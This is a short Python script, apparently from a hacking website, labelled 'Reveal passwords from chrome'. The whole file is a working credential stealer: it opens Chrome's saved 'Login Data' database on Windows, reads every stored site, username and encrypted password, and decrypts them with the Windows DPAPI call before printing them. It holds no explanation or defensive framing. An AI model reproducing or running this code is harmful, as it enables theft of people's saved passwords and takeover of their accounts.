#!/usr/bin/env python
#Reveal passwords from chrome
import sqlite3
import win32crypt
import os
__author__ = "Matan"
__version__ = "1.0.0"
__maintainer__ = "http://www.hackil.co.il"

con = sqlite3.connect(os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data')
cursor = con.cursor()
cursor.execute("SELECT origin_url,username_value,password_value from logins;")
for users in cursor.fetchall():
	print(users[0],users[1],win32crypt.CryptUnprotectData(users[2], None, None, None, 0),)
